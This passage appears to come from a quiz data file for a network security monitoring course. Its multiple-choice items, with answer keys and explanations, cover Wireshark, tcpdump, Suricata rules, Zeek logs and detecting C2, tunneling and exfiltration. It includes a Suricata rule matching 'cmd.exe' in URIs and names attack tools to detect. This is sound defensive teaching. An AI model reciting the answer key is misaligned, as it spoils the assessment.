        explanation: "VPC Flow Logs give ubiquitous 5-tuple metadata (cheap, broad); VPC Traffic Mirroring provides packet-level feeds to Zeek/Suricata for the subnets that warrant it. Together they approximate on-prem TAP+metadata coverage."
      },
      {
        id: "nsm-q1-8",
        difficulty: "hard",
        tags: ["Chain of Custody", "Forensics"],
        scenario: "A capture from your sensor may be introduced as evidence. During review, defense counsel asks how you know the PCAP wasn't modified.",
        question: "Which control most directly supports integrity/authenticity?",
        options: [
          "The file has a .pcap extension",
          "Cryptographic hash (SHA-256) recorded at capture time, stored in a write-once evidence log, with documented custody transfers",
          "The analyst 'remembers' downloading it",
          "The SIEM index makes it tamper-proof"
        ],
        correctAnswer: 1,
        explanation: "Evidentiary integrity requires a hash taken as close to capture as possible, immutably logged, plus a documented custody chain. Everything else is procedural hygiene around that anchor."
      },
      {
        id: "nsm-q1-9",
        difficulty: "hard",
        tags: ["Asymmetric Routing"],
        scenario: "Your sensor sees the client-to-server half of many TCP sessions but not the server-to-client half. Zeek conn logs show 'history' fields like 'S' with no 'h' and many 'missed_bytes'.",
        question: "What is the most likely root cause?",
        options: [
          "Suricata is misconfigured",
          "Asymmetric routing — return traffic egresses via a different path/uplink that the sensor does not TAP",
          "The clients are all offline",
          "TLS 1.3 hides return traffic"
        ],
        correctAnswer: 1,
        explanation: "One-sided flows and 'missed_bytes' are textbook symptoms of asymmetric routing. The fix is to aggregate all relevant uplinks into the sensor (packet broker / aggregation TAP) so both directions land on the same analysis stream."
      },
      {
        id: "nsm-q1-10",
        difficulty: "medium",
        tags: ["NSM vs IDS"],
        scenario: "A vendor pitches: 'Our IPS replaces your NSM stack — if it doesn't alert, nothing bad happened.'",
        question: "Which counter-argument is strongest?",
        options: [
          "Agree — signature IPS is comprehensive",
          "NSM's value is retrospective and investigative: rich metadata lets you answer new questions about past traffic (post-CVE hunts, IR scoping) that no real-time IPS can retroactively provide",
          "IPS cannot block traffic",
          "IPS is always cheaper"
        ],
        correctAnswer: 1,
        explanation: "IPS is a real-time filter tied to what was known at the time of the packet. NSM's persistent, structured record of who talked to whom, when, how much, and with what fingerprints is what enables retro-hunts, IR scoping, and threat-informed detection engineering."
      }
    ]
  },
  {
    quizId: "nsm-q2",
    courseId: "network-security-monitoring",
    title: "Packet Capture & Wireshark Tradecraft",
    description: "Scenario-driven PCAP triage, filter craft, and packet-level investigation.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q2-1",
        difficulty: "easy",
        tags: ["Wireshark", "Filters"],
        scenario: "You need every packet to/from 10.0.5.23 involving TCP/445 for the last hour and nothing else, from a live 10 Gbps span.",
        question: "Where should this filter live for correctness and performance?",
        options: [
          "Wireshark display filter only, capturing everything to disk",
          "As a BPF capture filter ('host 10.0.5.23 and tcp port 445') so the kernel discards uninteresting packets before write",
          "In Suricata rules",
          "In the firewall ACL"
        ],
        correctAnswer: 1,
        explanation: "Capture filters (BPF) run in-kernel and drop unwanted packets before they hit disk or user space — essential on a 10 Gbps link. Display filters only filter what you already captured."
      },
      {
        id: "nsm-q2-2",
        difficulty: "easy",
        tags: ["tcpdump", "BPF"],
        scenario: "You need to capture DNS queries for the string 'evil' anywhere in the payload during an incident.",
        question: "Which approach is most appropriate on the sensor host?",
        options: [
          "tcpdump -i eth0 -w dns.pcap 'udp port 53' — then grep the pcap with tshark/strings",
          "grep the raw NIC device",
          "Wireshark GUI on the production sensor",
          "Reboot the sensor"
        ],
        correctAnswer: 0,
        explanation: "Capture the constrained slice with a BPF filter to disk, then post-process with tshark/tcpdump/zeek. Running a GUI on production sensors is discouraged; grepping /dev/eth0 is nonsense."
      },
      {
        id: "nsm-q2-3",
        difficulty: "medium",
        tags: ["Wireshark", "TCP Analysis"],
        scenario: "Wireshark's Expert Info shows many 'TCP Previous segment not captured' and 'TCP Out-of-Order' messages for a session you're analyzing.",
        question: "What is the most defensible interpretation before drawing security conclusions?",
        options: [
          "The attacker is fragmenting packets deliberately",
          "The capture is likely incomplete or reordered (sensor drops, asymmetric routing, or misordered SPAN) — validate capture fidelity before interpreting the session",
          "The session is definitely benign",
          "This is proof of a covert channel"
        ],
        correctAnswer: 1,
        explanation: "Those expert messages are capture-quality signals as often as they are attacker behavior. Confirm sensor health, drops, and both directions are present before making security claims from the flow."
      },
      {
        id: "nsm-q2-4",
        difficulty: "medium",
        tags: ["Follow Stream", "HTTP"],
        scenario: "In an HTTP session Wireshark's Follow TCP Stream shows a base64 blob after 'Cookie:' that decodes to a serialized .NET object.",
        question: "What is the strongest hypothesis?",
        options: [
          "Normal session state",
          "Potential .NET deserialization payload — pivot to server logs and check for CVEs affecting the endpoint framework (e.g., ViewState, BinaryFormatter)",
          "Random noise",
          "TLS handshake"
        ],
        correctAnswer: 1,
        explanation: "Serialized .NET objects transmitted in cookies/headers are a known RCE vector (ViewState/BinaryFormatter). This warrants immediate server-side investigation and payload preservation."
      },
      {
        id: "nsm-q2-5",
        difficulty: "medium",
        tags: ["Wireshark", "SMB"],
        scenario: "You have a PCAP of suspected ransomware precursors. You want just the SMB2 write commands to file shares over the last 10 minutes.",
        question: "Which display filter is correct?",
        options: [
          "smb2.cmd == 9",
          "smb == write",
          "tcp.port == 445",
          "http contains 'smb'"
        ],
        correctAnswer: 0,
        explanation: "SMB2 command 9 is WRITE. 'tcp.port == 445' is too broad (includes reads, tree connects, negotiate); 'smb == write' isn't valid Wireshark syntax; HTTP is unrelated."
      },
      {
        id: "nsm-q2-6",
        difficulty: "medium",
        tags: ["File Carving", "tshark"],
        scenario: "You need to extract all objects transferred over HTTP from a 4 GB PCAP for malware triage.",
        question: "Which is the fastest correct approach on the CLI?",
        options: [
          "tshark -r file.pcap --export-objects http,./out/",
          "Manually copy hex bytes from Wireshark",
          "strings file.pcap > out.bin",
          "tcpdump -X file.pcap"
        ],
        correctAnswer: 0,
        explanation: "tshark's --export-objects reassembles TCP streams and writes each HTTP object as a file — the standard headless way to carve at scale. 'strings' loses structure; hex copying doesn't scale."
      },
      {
        id: "nsm-q2-7",
        difficulty: "hard",
        tags: ["JA3", "TLS Fingerprint"],
        scenario: "Two clients in the same subnet connect to the same IP:443. Wireshark shows identical ClientHello SNI = 'update.example.com' but different JA3 hashes.",
        question: "What is the most likely explanation?",
        options: [
          "They are the same process on both hosts",
          "Different TLS stacks/libraries (e.g., one is the OS updater using schannel, the other a malware sample using a custom Go/Python TLS stack) — JA3 encodes cipher/extension order, which differs by library",
          "One host is offline",
          "SNI is always forged"
        ],
        correctAnswer: 1,
        explanation: "JA3 hashes the client's TLS handshake parameters. Two libraries connecting to the same server produce distinct JA3s. This is why JA3/JA4 is powerful for spotting non-browser clients pretending to be legitimate updaters."
      },
      {
        id: "nsm-q2-8",
        difficulty: "hard",
        tags: ["Wireshark", "Statistics"],
        scenario: "You suspect beaconing inside a large PCAP. You want to see per-destination connection rate over time.",
        question: "Which Wireshark feature is most useful?",
        options: [
          "Follow Stream",
          "Statistics → Conversations, plus Statistics → I/O Graph filtered per destination, to reveal periodic intervals characteristic of beacons",
          "Preferences → Colors",
          "File → Export Specified Packets"
        ],
        correctAnswer: 1,
        explanation: "Conversations quantifies who-talked-to-whom; the I/O Graph plots packet/byte rate over time. Periodic spikes at fixed intervals to a destination are the beaconing signature."
      },
      {
        id: "nsm-q2-9",
        difficulty: "hard",
        tags: ["mergecap", "editcap"],
        scenario: "You have 40 rotating pcap files (100 MB each) captured across 6 hours and need to work on a single session that started at 03:14 UTC.",
        question: "Which workflow is most efficient?",
        options: [
          "Open all 40 in Wireshark simultaneously",
          "mergecap the relevant files → editcap -A/-B to slice by time window → open only the trimmed pcap in Wireshark",
          "Concatenate with cat",
          "Rename to .txt and grep"
        ],
        correctAnswer: 1,
        explanation: "mergecap correctly stitches pcaps preserving timestamps; editcap slices by time range. This yields a small, precise file for analysis instead of overwhelming Wireshark or corrupting headers with cat."
      },
      {
        id: "nsm-q2-10",
        difficulty: "medium",
        tags: ["Privacy", "Handling"],
        scenario: "A PCAP contains employee credentials submitted over plain HTTP to a compromised intranet form.",
        question: "What is the correct handling posture?",
        options: [
          "Post the PCAP to a public sandbox for analysis",
          "Treat as sensitive: restrict access, redact/rotate exposed credentials, follow evidence handling per policy, and never upload to third-party services without approval",
          "Email it to all analysts",
          "Delete immediately with no notification"
        ],
        correctAnswer: 1,
        explanation: "PCAPs frequently contain PII, credentials, and session tokens. Handle under evidence policy, restrict access, drive credential rotation, and never upload to public sandboxes without explicit authorization."
      }
    ]
  },
  {
    quizId: "nsm-q3",
    courseId: "network-security-monitoring",
    title: "Suricata Detection Engineering",
    description: "Realistic Suricata rule authoring, tuning, and IPS operations.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q3-1",
        difficulty: "easy",
        tags: ["Suricata", "Rule Syntax"],
        scenario: "You want to alert on any HTTP request to external hosts containing 'cmd.exe' in the URI.",
        question: "Which rule is syntactically and semantically correct?",
        options: [
          "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"Suspicious URI cmd.exe\"; http.uri; content:\"cmd.exe\"; nocase; sid:1000001; rev:1;)",
          "alert tcp any any -> any 80 (content:\"cmd.exe\";)",
          "drop ip any any -> any any (msg:\"bad\";)",
          "log http any -> any (uri:\"cmd.exe\";)"
        ],
        correctAnswer: 0,
        explanation: "The correct rule scopes direction, uses the http protocol parser with the http.uri sticky buffer, includes nocase, and provides sid/rev/msg — all Suricata requirements for a valid, maintainable rule."
      },
      {
        id: "nsm-q3-2",
        difficulty: "easy",
        tags: ["Suricata", "Actions"],
        scenario: "Suricata is deployed inline on an IPS interface. A rule uses action 'alert'.",
        question: "What happens when the rule matches?",
        options: [
          "The packet is dropped and the session reset",
          "An event is logged; the packet is NOT blocked — 'drop' or 'reject' is required to prevent traffic inline",
          "The connection is quarantined for 24 hours",
          "The user is emailed"
        ],
        correctAnswer: 1,
        explanation: "'alert' only logs. Inline blocking requires 'drop' (silent) or 'reject' (send RST/ICMP). Mixing these up is a common cause of 'why isn't the IPS blocking?' incidents."
      },
      {
        id: "nsm-q3-3",
        difficulty: "medium",
        tags: ["Suricata", "flowbits"],
        scenario: "You want to alert only when a client first POSTs to '/upload' AND later downloads a file matching a suspicious pattern in the same session.",
        question: "Which Suricata construct chains these two events?",
        options: [
          "threshold",
          "flowbits (set on the POST, isset on the download) to stitch stateful multi-step detections",
          "xbits: iprep",
          "pcre only"
        ],
        correctAnswer: 1,
        explanation: "flowbits let a first rule 'set' a marker on a flow and a second rule 'isset' to fire only if the marker exists — the standard way to build multi-step, in-flow detections."
      },
      {
        id: "nsm-q3-4",
        difficulty: "medium",
        tags: ["Suricata", "Performance"],
        scenario: "A rule using pcre against every HTTP body is causing high CPU on the sensor.",
        question: "Which optimization is best practice?",
        options: [
          "Remove all rules",
          "Anchor with a fast_pattern content match first (a cheap literal) and only fall through to pcre on candidates; scope with http.request_body and appropriate depth/offset",
          "Increase pcre recursion limits blindly",
          "Disable HTTP parsing"
        ],
        correctAnswer: 1,
        explanation: "Suricata's detection engine short-circuits on the fast_pattern content match; pcre should only run on pre-filtered candidates. Scoping to the right sticky buffer with depth/offset limits work further."
      },
      {
        id: "nsm-q3-5",
        difficulty: "medium",
        tags: ["Suricata", "Tuning"],
        scenario: "An ET rule fires 20,000 times per day on a legitimate vulnerability scanner in your DMZ.",
        question: "Which tuning approach is most maintainable?",
        options: [
          "Delete the rule entirely",
          "Suppress or threshold the rule for the scanner's source IP(s) via suppress/threshold.config, keeping detection elsewhere",
          "Increase timeLimit on the analyst queue",
          "Reboot the sensor daily"
        ],
        correctAnswer: 1,
        explanation: "Scoped suppression preserves detection for the rest of the environment while eliminating known-benign noise from an authorized scanner — the canonical Suricata tuning pattern."
      },
      {
        id: "nsm-q3-6",
        difficulty: "medium",
        tags: ["Suricata", "TLS"],
        scenario: "You want to detect connections to a known-bad server certificate hash regardless of SNI or IP.",
        question: "Which keyword should you use?",
        options: [
          "tls.sni",
          "tls.cert_fingerprint (SHA1 of the leaf cert) — resilient to IP rotation and SNI changes",
          "http.uri",
          "dns.query"
        ],
        correctAnswer: 1,
        explanation: "Cert fingerprints identify the actual TLS server certificate; attackers can rotate IPs and SNIs, but reusing the same cert leaves this fingerprint. This is a durable IOC when available."
      },
      {
        id: "nsm-q3-7",
        difficulty: "hard",
        tags: ["Suricata", "Bypass"],
        scenario: "An attacker fragments an HTTP request across many small TCP segments so signatures matching 'cmd.exe' on individual packets miss.",
        question: "Which Suricata capability defeats this?",
        options: [
          "Stateless per-packet inspection",
          "Stream reassembly + HTTP parser (rules run on reassembled application-layer buffers, not raw packets) — with adequate stream memory settings",
          "Disabling TCP",
          "Running Suricata on the client"
        ],
        correctAnswer: 1,
        explanation: "Suricata reassembles TCP streams and parses application protocols so signatures run against normalized buffers, defeating simple segmentation evasion. Adequate stream.memcap and reassembly settings are required."
      },
      {
        id: "nsm-q3-8",
        difficulty: "hard",
        tags: ["Suricata", "Lua"],
        scenario: "You need a detection that only fires when the JA3 hash matches one of ~500 known-bad hashes.",
        question: "Which approach scales best?",
        options: [
          "Write 500 individual rules",
          "Use a datasets/iprep-style set (ja3.hash; dataset:isset,ja3_bad;) or a Lua rule that checks against a hashed set — O(1) lookup per event",
          "Grep eve.json after the fact only",
          "Do nothing — 500 is too many"
        ],
        correctAnswer: 1,
        explanation: "Suricata datasets allow O(1) set membership checks against large lists (JA3s, SHA256s, URLs) inside a single rule — vastly more efficient than 500 sid entries."
      },
      {
        id: "nsm-q3-9",
        difficulty: "hard",
        tags: ["IPS Deployment"],
        scenario: "Before flipping Suricata from IDS to IPS on a production egress link, what is the single most important pre-flight check?",
        question: "Choose the strongest control:",
        options: [
          "Confirm all rules are 'alert' only, then flip",
          "Run in 'IDS + drop-audit' (or copy-mode) shadowing the traffic; verify no legitimate business flows would be dropped by current rule set, then enable inline drop on a curated subset",
          "Delete all rules",
          "Skip testing to save time"
        ],
        correctAnswer: 1,
        explanation: "Turning a rich alert ruleset into inline drops without shadow-testing is how outages happen. Shadow evaluation and staged enablement of a curated 'drop' subset is the safe path to IPS."
      },
      {
        id: "nsm-q3-10",
        difficulty: "medium",
        tags: ["Suricata", "eve.json"],
        scenario: "You're building SIEM correlation on Suricata eve.json.",
        question: "Which event_type set gives the richest correlation surface beyond just alerts?",
        options: [
          "alert only",
          "alert + http + dns + tls + fileinfo + flow — protocol metadata that lets you pivot from any alert into full session context",
          "flow only",
          "stats only"
        ],
        correctAnswer: 1,
        explanation: "Alerts alone answer 'did a rule fire?'. Protocol events (http/dns/tls/fileinfo/flow) let you enrich, pivot, and detect on metadata even where no rule matched — this is what makes Suricata a first-class NSM source, not just an IDS."
      }
    ]
  },
  {
    quizId: "nsm-q4",
    courseId: "network-security-monitoring",
    title: "Zeek Metadata & Scripting",
    description: "Zeek log pivots, UID correlation, and script-driven detections.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q4-1",
        difficulty: "easy",
        tags: ["Zeek", "conn.log"],
        scenario: "In conn.log you see: proto=tcp service=ssl duration=3612.4 orig_bytes=2048 resp_bytes=1873400000 conn_state=SF to a rare external ASN.",
        question: "What is the strongest hypothesis?",
        options: [
          "Normal HTTPS browsing",
          "Long-lived TLS session with massive server-to-client transfer — candidate for tunneled ingress or a large download; pivot to ssl.log and files.log for context",
          "SSH brute force",
          "DNS exfiltration"
        ],
        correctAnswer: 1,
        explanation: "conn_state SF (normally-terminated), hour-long duration, and ~1.8 GB responder bytes to a rare ASN is a classic large-egress/tunnel shape. Pivot via UID to ssl.log (JA3, cert, SNI) and files.log."
      },
      {
        id: "nsm-q4-2",
        difficulty: "easy",
        tags: ["Zeek", "UID"],
        scenario: "You have a Zeek alert referencing UID 'CxT4a91XyZ'.",
        question: "What does the UID enable?",
        options: [
          "Nothing — Zeek doesn't correlate logs",
          "A single connection identifier that joins conn.log, http.log, ssl.log, files.log, dns.log, notice.log etc. — pivot across every protocol log for the same session",
          "The user's Windows SID",
          "A firewall rule ID"
        ],
        correctAnswer: 1,
        explanation: "The Zeek UID is the primary key for a connection across every protocol log — it is what makes Zeek's metadata investigable at scale."
      },
      {
        id: "nsm-q4-3",
        difficulty: "medium",
        tags: ["Zeek", "dns.log"],
        scenario: "dns.log shows a host issuing 4,500 A-record queries per hour to subdomains of a single parent domain, each subdomain ~50 chars of base32-like text.",
        question: "What is the most likely activity?",
        options: [
          "Normal CDN behavior",
          "DNS tunneling / DNS-based C2 or exfil (Cobalt Strike DNS beacon, dnscat2, iodine) — high query volume + long unique subdomains encoding data",
          "Time sync",
          "Wi-Fi captive portal"
        ],
        correctAnswer: 1,
        explanation: "High rate + long high-entropy unique subdomains under one parent is the canonical DNS tunneling fingerprint. Pivot to conn.log for volume and to the resolver logs for scope."
      },
      {
        id: "nsm-q4-4",
        difficulty: "medium",
        tags: ["Zeek", "http.log"],
        scenario: "http.log entries show many POSTs to /gate.php with user_agent 'Mozilla/4.0' and short repeating request bodies to the same host every 60 seconds.",
        question: "What detection best characterizes this?",
        options: [
          "Legitimate browser telemetry",
          "HTTP beacon consistent with C2 (fixed cadence, small POSTs, ancient UA, gate.php-style endpoint) — pivot to conn history and files.log for tasked payloads",
          "Certificate transparency",
          "Kerberos"
        ],
        correctAnswer: 1,
        explanation: "Fixed-interval POSTs, tiny bodies, suspicious endpoint, and a stale UA is a textbook HTTP C2 beacon (many commodity RATs and older Cobalt Strike profiles). Correlate over UID for the whole picture."
      },
      {
        id: "nsm-q4-5",
        difficulty: "medium",
        tags: ["Zeek", "ssl.log"],
        scenario: "ssl.log shows subject='CN=localhost' issuer='CN=localhost' validation_status='self signed certificate' for a session on port 443 to an internet host.",
        question: "How should you triage?",
        options: [
          "Ignore — self-signed certs are always benign",
          "Alert / hunt: self-signed cert to a public destination on 443 is unusual and correlates with C2 frameworks (default Cobalt Strike, Metasploit profiles) — pivot to JA3/JA3S and destination reputation",
          "Add to allowlist",
          "It's DNS"
        ],
        correctAnswer: 1,
        explanation: "Legitimate public services present CA-signed certificates. Self-signed CN=localhost/example on a public endpoint is a strong C2 indicator, especially when combined with well-known JA3/JA3S signatures."
      },
      {
        id: "nsm-q4-6",
        difficulty: "medium",
        tags: ["Zeek", "files.log"],
        scenario: "files.log records a transferred file: mime_type='application/x-dosexec' source='HTTP' md5='<hash>' filename='update.exe' from a rare host.",
        question: "What is the correct next step?",
        options: [
          "Ignore all executables",
          "Hunt the hash across EDR and other Zeek files.log entries; pivot conn.log by UID for the delivery session; check destination reputation and JA3",
          "Delete the log",
          "Reboot the sensor"
        ],
        correctAnswer: 1,
        explanation: "files.log gives you the hash and delivery context. Cross-correlate with EDR to see execution, and Zeek pivots let you scope how many other hosts saw the same file."
      },
      {
        id: "nsm-q4-7",
        difficulty: "hard",
        tags: ["Zeek", "Scripting"],
        scenario: "You want a Zeek script that raises a NOTICE when a single source IP contacts more than 100 unique destination IPs on the same port within 60 seconds.",
        question: "Which Zeek primitive is best suited?",
        options: [
          "Custom awk script on conn.log",
          "SumStats framework (or a table with a 'when' expression) — designed for streaming, sliding-window aggregates across observations",
          "iptables",
          "A shell cron job"
        ],
        correctAnswer: 1,
        explanation: "Zeek's SumStats framework is purpose-built for high-throughput, in-cluster sliding-window aggregations — the right tool for rate/cardinality detections like scan behavior."
      },
      {
        id: "nsm-q4-8",
        difficulty: "hard",
        tags: ["Zeek", "Intel Framework"],
        scenario: "You have a threat-intel feed of ~50k domains, IPs, file hashes, and SSL cert fingerprints. You want automatic matches with rich context in notice.log.",
        question: "Which mechanism should you use?",
        options: [
          "Write a rule per indicator",
          "Zeek's Intel Framework (Intel::read_files) — supports multiple indicator types, cluster distribution, and cross-log matching by design",
          "Custom bash grep on logs",
          "Ignore intel entirely"
        ],
        correctAnswer: 1,
        explanation: "The Intel framework consumes tab-separated indicator files, matches across protocol events (dns.log, http.log, ssl.log, files.log, x509.log), and emits Intel::Notice — the right scale and integration point."
      },
      {
        id: "nsm-q4-9",
        difficulty: "hard",
        tags: ["Zeek Cluster"],
        scenario: "Your Zeek is dropping packets at peak. You inspect capture_loss.log and see loss>1% consistently on one worker.",
        question: "Which fix is architecturally correct?",
        options: [
          "Ignore capture_loss.log",
          "Add workers / distribute across cores using AF_PACKET fanout or PF_RING with symmetric hashing, ensure NUMA-local pinning, and verify manager/proxy sizing",
          "Disable logging",
          "Reduce log retention"
        ],
        correctAnswer: 1,
        explanation: "capture_loss.log is Zeek telling you the capture plane is overwhelmed. The right response is horizontal scaling of workers with proper flow-based load balancing and NUMA pinning."
      },
      {
        id: "nsm-q4-10",
        difficulty: "medium",
        tags: ["Zeek vs Suricata"],
        scenario: "A colleague argues Zeek and Suricata are redundant.",
        question: "Which framing best captures why mature SOCs run both?",
        options: [
          "Suricata is deprecated",
          "Zeek produces rich stateful protocol metadata (hunt & context); Suricata is a high-performance signature engine (known-bad detection). They complement — one gives investigability, the other gives real-time hits.",
          "Zeek is only for research",
          "They're identical, pick either"
        ],
        correctAnswer: 1,
        explanation: "The tools solve different problems: Zeek = protocol-aware metadata & scripting (analyst power tool); Suricata = signature/heuristic real-time detection & IPS. Running both is the standard NSM pattern."
      }
    ]
  },
  {
    quizId: "nsm-q5",
    courseId: "network-security-monitoring",
    title: "Network Attack Detection",
    description: "Detecting recon, C2, lateral movement, and exfiltration from network telemetry.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "nsm-q5-1",
        difficulty: "easy",
        tags: ["Recon", "Scanning"],
        scenario: "conn.log entries: one source IP, 10,000 destinations in /16, port 445, duration<0.1s, conn_state='S0' (SYN sent, no reply).",
        question: "Which activity does this describe?",
        options: [
          "Legitimate backup",
          "TCP SYN sweep (half-open scan) for SMB — S0 with tiny duration across many destinations on a single port",
          "DNS query flood",
          "Kerberos golden ticket"
        ],
        correctAnswer: 1,
        explanation: "'S0' means SYN was sent but no response was recorded; combined with wide destination fan-out on one port, this is the classic Zeek fingerprint of a SYN sweep."
      },
      {
        id: "nsm-q5-2",
        difficulty: "medium",
        tags: ["C2", "Beaconing"],
        scenario: "A host connects to a single external IP every 300±5 seconds for 4 hours, ~2 KB up / 300 B down each time, TLS with a self-signed cert.",
        question: "Which detection technique most directly identifies this?",
        options: [
          "Signature match on payload",
          "Time-series periodicity analysis (jitter-tolerant interval detection) on conn.log/ssl.log, weighted by rare destination and self-signed cert",
          "Kerberos audit",
          "USB device inventory"
        ],
        correctAnswer: 1,
        explanation: "Beacon hunting relies on statistical periodicity of connection intervals (with tolerance for jitter), fused with metadata weakness signals (self-signed cert, rare destination, small symmetric payloads)."
      },
      {
        id: "nsm-q5-3",
        difficulty: "medium",
        tags: ["Lateral Movement", "SMB"],
        scenario: "Zeek smb_files.log shows a single account writing 'psexecsvc.exe' to ADMIN$ shares on 12 different hosts within 10 minutes, followed by service-related SMB activity.",
        question: "What is this?",
        options: [
          "Software patching",
          "Lateral movement using PsExec-style remote service execution (T1021.002 / T1569.002) — high-confidence detection candidate",
          "Backup job",
          "Kerberos delegation"
        ],
        correctAnswer: 1,
        explanation: "Writing a service binary to ADMIN$ then service creation on many hosts by one account is textbook PsExec-style lateral movement — MITRE T1021.002 / T1569.002."
      },
      {
        id: "nsm-q5-4",
        difficulty: "medium",
        tags: ["Exfiltration"],
        scenario: "A workstation uploads 12 GB over HTTPS to a newly registered domain (<7 days) in a rare ASN between 02:00-04:00 local time.",
        question: "Which detection composition is strongest?",
        options: [
          "Single-signal alert on byte count",
          "Composite score: large upload + rare/new domain + rare ASN + off-hours + user role baseline deviation — reduces FPs and prioritizes triage",
          "Ignore since it's TLS",
          "Block all HTTPS"
        ],
        correctAnswer: 1,
        explanation: "Any single signal (bytes, new domain, off-hours) alone produces noise. Composite scoring across independent weak signals yields high-precision exfiltration alerts."
      },
      {
        id: "nsm-q5-5",
        difficulty: "medium",
        tags: ["DNS Tunneling"],
        scenario: "dns.log for a host shows: 6,000 TXT queries in 5 minutes, avg subdomain length 55 chars, high Shannon entropy per label, all under one parent domain.",
        question: "Which conclusion is most defensible?",
        options: [
          "Legitimate SPF lookups",
          "DNS tunneling (likely TXT-based C2 or exfil) — high volume + long high-entropy labels + single parent domain",
          "NTP sync",
          "Windows Update"
        ],
        correctAnswer: 1,
        explanation: "TXT queries are attacker-friendly for encoding data. High volume, long high-entropy labels, and single parent domain is the DNS tunneling fingerprint (iodine/dnscat2/CS DNS beacon)."
      },
      {
        id: "nsm-q5-6",
        difficulty: "hard",
        tags: ["Kerberoasting"],
        scenario: "You see repeated Kerberos TGS-REP responses with etype=23 (RC4-HMAC) requested by one workstation for many SPNs across the domain.",
        question: "What is this behavior?",
        options: [
          "Normal domain login",
          "Kerberoasting (T1558.003) — attacker requests service tickets with RC4 to crack offline for service-account passwords",
          "DHCP renewal",
          "Certificate enrollment"
        ],
        correctAnswer: 1,
        explanation: "RC4 TGS requests are attacker-preferred because they are crackable offline. A workstation fetching many SPN tickets is the Kerberoasting fingerprint."
      },
      {
        id: "nsm-q5-7",
        difficulty: "hard",
        tags: ["ICMP Tunnel"],
        scenario: "One host sends 8,000 ICMP echo requests to a single external IP over 30 min, average payload 1400 bytes (max), highly variable content.",
        question: "Which conclusion is best?",
        options: [
          "Ping is always benign",
          "Likely ICMP tunneling / exfil (ptunnel/icmptx) — large variable payloads and sustained volume in echo requests are abnormal",
          "TCP retransmission",
          "DHCP"
        ],
        correctAnswer: 1,
        explanation: "Legitimate ping uses small, uniform payloads. Sustained, large, variable-content echo requests indicate data being smuggled inside ICMP payloads."
      },
      {
        id: "nsm-q5-8",
        difficulty: "hard",
        tags: ["TLS C2", "JA3"],
        scenario: "Two internal hosts contact different external IPs but share the identical JA3='72a589da586844d7f0818ce684948eea' and destination cert CN='localhost'.",
        question: "What is the strongest hypothesis?",
        options: [
          "Coincidence",
          "Same C2 framework/beacon (matching TLS stack + self-signed default cert) on two compromised hosts — pivot immediately for scoping",
          "Both are Chrome",
          "Both are Windows Update"
        ],
        correctAnswer: 1,
        explanation: "Matching JA3 + identical suspicious default cert across hosts points to the same tooling/binary. Treat as a scoping event — hunt other hosts with that JA3 or destination pattern."
      },
      {
        id: "nsm-q5-9",
        difficulty: "hard",
        tags: ["Exfil", "Cloud"],
        scenario: "A user uploads 8 GB to a personal drive.google.com endpoint from a corporate workstation over TLS.",
        question: "Which NSM signal(s) are usable given the TLS?",
        options: [
          "None — TLS makes it invisible",
          "SNI = drive.google.com + total responder/originator bytes + destination reputation category (personal cloud) + user baseline — sufficient to trigger a DLP/policy review even without payload",
          "Only PCAP would help",
          "IPS drops it automatically"
        ],
        correctAnswer: 1,
        explanation: "SNI and byte counts remain visible in TLS 1.2/1.3 (pre-ECH), and destination categorization plus baseline deviation are enough for high-fidelity DLP triage without touching payload."
      },
      {
        id: "nsm-q5-10",
        difficulty: "medium",
        tags: ["ATT&CK Mapping"],
        scenario: "During a case you have: SYN sweep → SMB write of service binary → new TLS beacon with self-signed cert → 12 GB HTTPS upload.",
        question: "Which ATT&CK mapping best summarizes the chain?",
        options: [
          "T1071 only",
          "Discovery (T1046) → Lateral Movement (T1021.002/T1569.002) → C2 (T1071.001 / T1573) → Exfiltration Over C2 or Web (T1041 / T1567)",
          "T1078 only",
          "T1499"
        ],
        correctAnswer: 1,
        explanation: "Sweep = Network Service Scanning; SMB service binary = Remote Services/System Services; beacon = Application Layer Protocol + Encrypted Channel; large upload = Exfiltration Over C2 or Web Service."
      }
    ]
  },
  {
    quizId: "nsm-q6",
    courseId: "network-security-monitoring",
    title: "Practical NSM Operations",
    description: "End-to-end NSM workflows, forensics, and program-level tradecraft.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "nsm-q6-1",
        difficulty: "easy",
        tags: ["Architecture", "SIEM"],
        scenario: "You are integrating Zeek and Suricata into a central SIEM across 5 sites.",
        question: "Which architecture is recommended?",
        options: [
          "Run Zeek and Suricata on the SIEM server itself",
          "Deploy on distributed sensors near the traffic; ship structured logs (eve.json / Zeek JSON) via Filebeat/Kafka to the SIEM for correlation",
          "Manually copy pcaps daily",
          "Only send alerts, discard metadata"
        ],
        correctAnswer: 1,
        explanation: "Sensors live at the data; the SIEM correlates. Log shipping via Filebeat/Kafka is the standard, resilient path — preserving Zeek and Suricata metadata for detection engineering and IR."
      },
      {
        id: "nsm-q6-2",
        difficulty: "easy",
        tags: ["Retention"],
        scenario: "Your regulator requires 1 year of network event retention; storage is finite.",
        question: "Which retention tiering is most practical?",
        options: [
          "1 year of full PCAP for everything",
          "Alerts + Zeek metadata for 12 months (hot/warm/cold), targeted full PCAP for 7-30 days at critical chokepoints",
          "Delete everything monthly",
          "PCAP only, no metadata"
        ],
        correctAnswer: 1,
        explanation: "Tiered retention matches cost to value: long-term metadata for investigability & compliance, short-term PCAP for deep-dive at critical points. Full-year PCAP is rarely economical."
      },
      {
        id: "nsm-q6-3",
        difficulty: "medium",
        tags: ["IR", "Scoping"],
        scenario: "An EDR alert names host WKS-042 as beaconing. You must scope how many other hosts talked to the same C2.",
        question: "Which NSM pivot is fastest?",
        options: [
          "Interview users",
          "Query Zeek conn.log/ssl.log for all internal sources connecting to the C2 IP/domain/JA3/cert fingerprint over the relevant window",
          "Reboot every workstation",
          "Wait for more EDR alerts"
        ],
        correctAnswer: 1,
        explanation: "NSM's central IR use is scoping: one query across Zeek metadata reveals every host that touched the C2 by IP, domain, JA3, or cert — vastly faster than endpoint-by-endpoint checks."
      },
      {
        id: "nsm-q6-4",
        difficulty: "medium",
        tags: ["Detection Engineering"],
        scenario: "A hunt discovered a new C2 pattern. You want it to become a durable detection.",
        question: "What is the correct handoff?",
        options: [
          "Post it in chat and hope",
